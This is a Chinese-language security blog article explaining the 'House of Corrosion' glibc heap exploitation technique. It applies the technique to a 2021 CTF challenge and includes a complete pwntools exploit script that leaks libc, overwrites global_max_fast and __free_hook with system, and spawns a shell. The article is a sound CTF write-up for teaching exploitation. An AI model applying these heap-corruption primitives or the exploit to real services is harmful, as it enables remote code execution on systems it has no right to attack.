# House of Corrosion 原理及利用

阅读量 **412012**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-12-23 10:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01ba71551687de0a8d.jpg)

## 利用思路

有些师傅可能看到这个名字有些陌生，但实际上这已经是一个很早以前就出现的利用方法了，一直适用到最新的 GLIBC 中。

要了解这个方法，我们首先要先知道 global_max_fast 是什么？简单的来说 global_max_fast 是 GLIBC 用来储存
fastbin 链表能够储存的最大大小，其默认值为 0x80，也就是 Fastbin 的默认 Size 范围是在 [0x20, 0x80]。

![](https://p5.ssl.qhimg.com/t0186730b620e65fc9b.png)

而此方法，其根本的思想就是通过往 global_max_fast 写入一个很大的值，来造成 fastbinsY
数组溢出。如果我们利用其他漏洞在这个位置写一个很大的值，会使得在 malloc 和 free 堆块的时候，很大 Size 堆块都被判定为是 fastbin
类型的堆块，fastbinsY 是在 GLIBC 上储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin
链表预留了十个指针。

![](https://p3.ssl.qhimg.com/t0127b6598d4c812282.png)

这意味着，如果有 SIZE 超过 0xB0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY
的最大范围，造成数组越界。我们可以使用以下公式来计算出目标溢出位置，对应的需要构造的堆块 SIZE，其中的 delta 指的是溢出位置到 fastbinsY
首地址的差值。

    
    
    chunk size = (delta * 2) + 0x20
    

接下来分为 malloc 和 free 两个方向来讲解此方法的应用。

## malloc

一般来说这种攻击方法是无法任意申请堆块地址的，一方面是因为申请的 Size 受到主程序限制，另一方面在 Fastbin 中申请出来堆块会检测 SIZE
位对应的索引是否与当前索引一致，如果不一致则会报错退出。

但是我们可以通过篡改 fastbin 链表来在 fastbinsY 后写一个可控的内容，但是前提是主程序可以申请出那个 SIZE 的堆块，利用思路如下

  1. free，SIZE 可以使得 fastbinsY 溢出到需要的位置
  2. 利用 UAF 漏洞，在此堆块的 fd 位置写我们要篡改的数据，8 字节。
  3. malloc，SIZE 和之前的一致

这里的可以利用的原因是：在 malloc 的时候会把 fastbinsY 的链表头部取出，并且把其 fd 位置的内容作为链表头部写入到 fastbinsY
数组中，而在这个过程中没有对可控堆块的 fd 位置的内容的合法性做检查。

## free

###  利用前提

由于在 free fastbin 堆块的时候会检测被 free 堆块的下一个堆块的 SIZE 是否合法，这意味着我们虽然可以通过直接伪造 SIZE
位来触发溢出，但是还需为 **伪造 SIZE 的堆块的下一个堆块** 伪造一个合法的 SIZE。所以这个方法有个利用的前提就是 **能为下一个堆块伪造
SIZE** ，以下提出的利用方法都在满足这个利用前提的情况下实现。

![](https://p1.ssl.qhimg.com/t01517859ec5eb6f3db.png)

###  泄露

利用这个方法可以泄露 libc 上在 fastbinsY 之后的数据，泄露的思想就是利用 free 时会把此堆块置入 fastbin 的头部，所以 free
后在此堆块的 fd 位置的内容，就是 free 前此 SIZE 的链表头部指针，通过越界就可以读取 LIBC 上某个位置的内容。

用 leakfind 命令可以看能泄露哪些空间的地址。

    
    
    leakfind 0x7f50fe111bb0 --page_name=house_of_fmyyass --max_offset=0x3000 --max_depth=3
    
    #address：0x7f50fe111bb0 （例如在此利用中应该为fastbinsY的首地址）
    #page_name: 找哪里的地址，例如：libc，stack
    #max_offset：范围（例如在此利用中，是最大能控制next chunk size的位置）
    #max_depth: 层数
    #其他选项...
    

###  写

写的思路与泄露的类似，就是利用在 free 后此 SIZE 的链表头部指针会变成被 free 的堆块指针。利用这个思路可以在 fastbinsY
之后写入堆块指针。

这个思路只能写入可控的堆块指针，而不是可控内容，但是相对于之前的方法，这个方法不要求主程序可以申请很大 SIZE 的堆块。

写入位置的选择就很多样了，只需要抓住一点，我们可以写入一个可控的堆块指针。而使用 Unsorted Bin Attack 或 Tcache Stashing
Unlink Attack 能够写入的内容都是在 LIBC 上，属于不可控的位置，通过这个打 global_max_fast
的思路，就可以把不可控地址的写入转换为可控地址的写入，这给我们提供一种利用思想。

  1. 在程序中有通过 exit 来退出循环，在这种情况下，我们就可以通过写 _IO_list_all 再配合不同版本 GLIBC 在 IO File 的攻击思想或考虑用 House of banana，最后 get shell。 
    1. 2.23 版本：对 vtable 的位置没有检测，可以直接在任意可控位置伪造一个 vtable，具体的利用思路可以参考 Angel Boy 的 House of orange 的打法。
    2. 2.27 版本：在 _IO_str_finsih 和 _IO_str_overflow 中有对函数指针的直接调用，可以通过调试找到对应位置并修改为 system。
    3. 2.28 – 2.33 版本：这部分版本把函数指针的调用改为了直接的 malloc 和 free 调用，这使得构造指针的思路不再有效，可以考虑用 House of pig 中的打法。
    4. 2.34 版本：这个版本把 __free_hook 和 __malloc_hook 都删除了，所以使得 house of pig 的打法也失效了，可以考虑使用 [House OF Emma](https://www.anquanke.com/post/id/260614) 来攻击。
  2. 覆写 Top Chunk 标志来触发 House OF Kiwi，House OF Kiwi 的利用条件有一部分在于触发在 assert 上，使用这个方法能够快速的让 Top Chunk 的 Size 变的“不合法”，再次申请大于写入堆块的 Size 的堆块就能触发 assert。
  3. 结合 House of banana 来攻击
  4. 结合 House of husk 来攻击，之后会单独写一篇 House of husk 文章中提出。

## 例题

这里以 2021 湖湘杯初赛 maybe_fun_game_3 这题为例来讲解本方法的实战利用

###  初始化

在程序正式运行之前，会使用 mmap 来分配一段空间，赋值给这里名为 dest 的变量，用于之后的加解密工作

![](https://p3.ssl.qhimg.com/t0140d8bf60db834e5c.png)

###  加密过程

加密分为两步，创建一个加密数据块和创建一个加密数据结构体

![](https://p1.ssl.qhimg.com/t01ecf74e6a552c6edf.png)

**加密数据块**

  1. 循环让 i 从 0x50 到 0xFE
  2. 每次循环生成两个随机数（rnd1、rnd2），并对 0x50 取模
  3. 把 Rnd1 放到下标为 i 的数组中
  4. 用 Rnd2 对从 0 到 i 作为下标的每一位内容做异或
  5. 把 Rnd1 到 i 作为下标的每一位内容向后移
  6. 把 Rnd2 放到下标为 Rnd1 的数组中

![](https://p1.ssl.qhimg.com/t0120265472700f48c3.png)

**创建结构体**

  1. 偏移 0： 0x6C616E6C616E7777（lanlanww）作为魔数来标记加密结构体内容
  2. 偏移 8：数据长度，限制为小于 0x50
  3. 偏移 0x10：加密后的数据内容
  4. 把以上结构内容用 base64 进行编码，并且用 puts 输出

![](https://p1.ssl.qhimg.com/t01e7fb6a1e35335658.png)

###  解密过程

解密过程我们可以根据加密过程来逆推，而在此题中因为需要双方交互，所以也存在解密函数。

**解析结构体**

  1. base64 解码
  2. 判定 maigc 是否一致
  3. 判断 长度 是否超过限制
  4. 如果该函数的参数 is_encode 为 1 则解密加密的数据，否则直接返回加密数据

当把数据放置到堆块时，会直接存放加密的数据，直至读取堆块内容时再进行二次解密。

![](https://p4.ssl.qhimg.com/t0108fdc88785339fd7.png)

**解密数据**

是加密过程的逆向，但是在实现中出现漏洞。

在解码过程中会引用到 Rnd1，在正常的加密过程中，这个随机数会对 0x50 取余，把数据限制在 0x50
以内，不会出现任何问题。但是在这里由于没有对直接写入堆块的内容进行检验，允许 Rnd1 大于 0x50，而在取 Rnd2 时，Rnd1 作为下标用的类型是
char ，构造使其可以为一个负数，造成 Rnd1 到 i 的每一位前移的过程中造成向前溢出，计算得到值为 0xE8 时正好可以向前溢出修改到
is_delete 结构的内容。

![](https://p4.ssl.qhimg.com/t014ba0d445cbb1cd13.png)

###  程序功能和逻辑

程序具有以下四个功能

  1. New
  2. Del
  3. Edit
  4. Show
  5. Backdoor

**New**

创建了一个大小为 0x110 的堆块，结构体如下。

把解析得到的数据大小放到 size 结构中，加密数据 0x100 字节内容完全复制到 data 结构中

    
    
    00000000 node            struc ; (sizeof=0x110, mappedto_15)
    00000000                                         ; XREF: main+12F/r
    00000000                                         ; main+13D/r ...
    00000000 data            db 256 dup(?)           ; XREF: main+3E4/r
    00000000                                         ; main+4E4/r ; string(C)
    00000100 size            dq ?                    ; XREF: main+13D/r
    00000100                                         ; main+2FC/w ...
    00000108 is_delete       dq ?                    ; XREF: main+12F/r
    00000108                                         ; main+1D0/r ...
    00000110 node            ends
    

![](https://p5.ssl.qhimg.com/t011e8f319cd2f80c85.png)

**Del**

释放结构体数据，并且标记 is_delete 位为 1，此时对 is_delete 结构的写入实际上存在 UAF，但是无法控制具体内容。

**Edit**

读入堆块内容，并且写入堆块内容的是加密后的数据块

![](https://p0.ssl.qhimg.com/t0141a1d4000160a71a.png)

**Show**

把堆块中的内容先经过解密再输出

![](https://p2.ssl.qhimg.com/t010a8c14974acfeeb6.png)

**Backdoor**

允许按照顺序触发后门功能，依照次序是 4，3，2，1

后门可以创建一个 Size 大于 0x2000 的堆块，并且可以在堆块释放后对堆块内容进行修改，从而造成了 UAF，结合这次所说的利用方法，不难想到以下内容
—— “在 malloc 的时候会把 fastbinsY 的链表头部取出，并且把其 fd 位置的内容作为链表头部写入到 fastbinsY
数组中，而在这个过程中没有对可控堆块的 fd 位置的内容的合法性做检查”

![](https://p0.ssl.qhimg.com/t018d1a69b1ef0d4178.png)

通过计算 0x3918 这个 Size，在 fastbinsY 溢出的情况下，正好可以覆盖到 __free_hook 的内容，这意味着我们可以借助后门来修改
__free_hook 上的内容。

![](https://p2.ssl.qhimg.com/t01d006f95577aeaf88.png)

###  利用思路

  1. 利用 Double Free 的报错泄露出远程的 LIBC 版本为 2.23
  2. 利用 Unsorted Bin 堆块可以在 FD 和 BK 位置存在一个 LIBC 地址，但是在使用 Show 功能时会对数据进行解密，解密过程会受到 LIBC 地址的内容影响，我们再把 Key 的内容全部设置为 0，这样异或时内容不会变化，有概率能够泄露出 Libc 基址，需要一定的爆破
  3. 我们可以在非 Backdoor 的功能处，利用向前溢出造出一个 UAF，再用 Unsorted Bin Attack 来打 global_max_fast
  4. 利用 Backdoor 4 的功能创建一个大小为 0x3918 的堆块
  5. 利用 Backdoor 3 的功能把这个堆块释放，此时在 __free_hook 处的内容为 fastbinsY 溢出的堆块指针
  6. 利用 Backdoor 2 的功能在这个堆块的 fd 位置写入 system 的函数指针
  7. 利用 Backdoor 1 的功能把这个堆块申请出来，这时候此堆块 fd 位置的内容会进入 fastbinsY，也就时 __free_hook 处会存在一个 system 函数指针。
  8. 再把提前构造好的 /bin/sh 给 free 掉，就会触发 system(‘/bin/sh’)

###  Exp

    
    
    import base64
    from pwn import *
    
    elf = None
    libc = None
    file_name = "./Maybe_fun_game_3"
    
    
    # context.timeout = 1
    
    
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    
    
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/home/cnitlrt/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    
    
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                if ":" in sys.argv[1]:
                    r = sys.argv[1].split(':')
                    return remote(r[0], int(r[1]))
                return remote(sys.argv[1], int(sys.argv[2]))
        else:
            return process(file_name)
    
    
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            if info == None:
                info = 'libc_base:\t'
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    
    
    def get_flag(sh):
        try:
            sh.recvrepeat(0.1)
            sh.sendline('cat flag')
            return sh.recvrepeat(0.3)
        except EOFError:
            return ""
    
    
    def get_gdb(sh, addr=None, gdbscript=None, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript)
        elif addr is not None:
            gdb.attach(sh, 'b *$rebase(' + hex(addr) + ")")
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    
    
    def Attack(target=None, elf=None, libc=None):
        global sh
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count < 30:
            try_count += 1
            try:
                pwn(sh, elf, libc)
                break
            except KeyboardInterrupt:
                break
            except EOFError:
                sh.close()
                if target is not None:
                    sh = target.get_sh()
                    target.sh = sh
                    if target.connect_fail:
                        return 'ERROR : Can not connect to target server!'
                else:
                    sh = get_sh()
        flag = get_flag(sh)
        return flag
    
    
    def decode(data):
        print data
        try:
            t = base64.b64decode(data)
            assert t[:8] == 'wwnalnal'
            size = u64(t[8:0x10])
            t = t[0x10:]
            for i in range(0xFE, 0x4F, -2):
                rnd1 = ord(t[i + 1: i + 2])
                rnd2 = ord(t[rnd1: rnd1 + 1])
                t = t[:rnd1] + t[rnd1 + 1: i + 1] + '\xFF' + t[i + 1:]
                for j in range(i):
                    t = t[:j] + chr(ord(t[j: j + 1]) ^ rnd2) + t[j + 1:]
            return t[:size]
        except:
            pass
    
    
    def encode_data(data):
        t = data.ljust(0x100, '\xFF')
        for i in range(0x50, 0x100, 2):
            rnd1 = 0
            rnd2 = 0
            t = t[:i] + chr(rnd1) + t[i + 1:]
            for j in range(i):
                t = t[:j] + chr(ord(t[j: j + 1]) ^ rnd2) + t[j + 1:]
            t = t[:rnd1] + chr(rnd2) + t[rnd1: i + 1] + t[i + 2:]
        return t
    
    
    def encode(data):
        return base64.b64encode(p64(0x6C616E6C616E7777) + p64(len(data)) + encode_data(data).ljust(0x100, '\xFF'))
    
    
    def pack_struct(data):
        return base64.b64encode(p64(0x6C616E6C616E7777) + p64(0x0) + data)
    
    
    def getline():
        return decode(sh.recvline())
    
    
    def recvuntil(t):
        try:
            while True:
                data = getline()
                if data == None:
                    raise EOFError
                print data
                if t in data:
                    return
        except:
            pass
    
    
    def senddata(t, type=1):
        if type == 0:
            data = pack_struct(t)
        else:
            data = encode(t)
        sh.sendline(data)
    
    
    def choice(idx):
        recvuntil('Choice')
        senddata(str(idx))
    
    
    def add(size, content):
        choice(1)
        recvuntil('[Create]Size?')
        senddata(str(size))
        recvuntil('[Create]Content?')
        senddata(content, 0)
        recvuntil('[Create]Done!')
    
    
    def delete(idx):
        choice(2)
        recvuntil('[Delete]Index?')
        senddata(str(idx))
        recvuntil('[Delete]Done!')
    
    
    def edit(idx, content):
        choice(3)
        recvuntil('[Edit]Index?')
        senddata(str(idx))
        recvuntil('[Edit]Content?')
        senddata(content, 0)
        recvuntil('[Edit]Done!')
    
    
    def show(idx):
        choice(4)
        recvuntil('[Query]Index?')
        senddata(str(idx))
        return getline()
    
    
    
    def pwn(sh, elf, libc):
        # context.log_level = "debug"
        sh.recvuntil('>>>>>>>>>>>>>>>>>>>>>\n')
        add(0x18, 'a' * 0x100)
        add(0x4f, encode_data('a' * 0x18))
        add(0x18, '\xE8' * 0x100)
    
        choice(5)
        recvuntil('[backdoor_msg]Size?')
        senddata(str(0x3918))
    
        edit(1, '\x00' * 0x50 + '\xE8' * 0x50)
        delete(1)
        edit(2, '\xE8' * 0x100)
        show(2)
    
        leak_data = show(1)
        log.hexdump(leak_data)
    
        leak_idx = leak_data.find('\x7f')
        if leak_idx < 5:
            leak_idx = leak_data.find('\x7f')
        libc_base = u64(leak_data[leak_idx - 5: leak_idx + 1].ljust(8, '\x00')) - 0x3c4b78
        if libc_base & 0xfff != 0:
            raise EOFError
        log.success("libc_base:\t" + hex(libc_base))
        pause()
        global_max_fast = libc_base + 0x3c67f8
        system_addr = libc_base + 0x453a0
        edit(1, p64(libc_base + 0x3c4b78) + p64(global_max_fast - 0x10))
        add(0x18, 'a' * 0x100)  # 3
        edit(3, p64(libc_base + 0x3c4b78) * 2)
        edit(0, "/bin/sh\x00" * 2)
        choice(5)
    
        choice(5)
        recvuntil('[backdoor_msg]Content?')
        senddata(p64(system_addr) * 2, 0)
        choice(5)
    
        choice(2)
        recvuntil('[Delete]Index?')
        senddata(str(0))
        sh.interactive()
    
    
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(elf=get_file(), libc=get_libc())
        sh.close()
        if flag != "":
            log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
    

## 总结

House of Corrosion 的利用思想还是在 LIBC 附近写堆地址，但是这种方法通过这样一种相对位置的方式来把 LIBC
偏移给抵消了，并且通过一定的爆破，降低了在初步攻击时所需要的条件，这样的简单方便的利用方法还有很多开发的空间，值得大家进一步的学习和挖掘。

## 参考资料

  1. [House of Corrosionの 解説](https://ptr-yudai.hatenablog.com/entry/2019/10/19/002039)
  2. [第七届“湖湘杯” House _OF _Emma | 设计思路与解析](https://www.anquanke.com/post/id/260614)
  3. [新版本 glibc 下的 IO_FILE 攻击](https://www.anquanke.com/post/id/216290)
  4. [house of banana](https://www.anquanke.com/post/id/222948)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **wjh** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/263622](/post/id/263622)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __14赞

 __收藏

![](https://p4.ssl.qhimg.com/t0162586615c462960c.png) wjh

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

